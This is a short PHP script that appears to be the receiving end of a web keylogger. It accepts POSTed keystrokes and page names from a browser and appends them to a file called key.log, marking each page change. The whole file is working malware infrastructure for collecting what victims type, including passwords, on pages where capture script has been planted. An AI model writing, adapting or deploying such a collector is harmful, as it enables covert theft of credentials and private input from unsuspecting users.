<?php
session_start();

if(!isset($_POST['key'])) { ### auth input
        echo("Access Denied!");
        exit(0);
}

$file= fopen("key.log","a+");

if(!isset($_SESSION['page']) || $_SESSION['page'] != $_POST['page']){
        $_SESSION['page'] = $_POST['page'];
        fwrite($file," [[[ PAGE : ".$_POST['page']."]]] ");
}

fwrite($file,$_POST['key']);
fclose($file);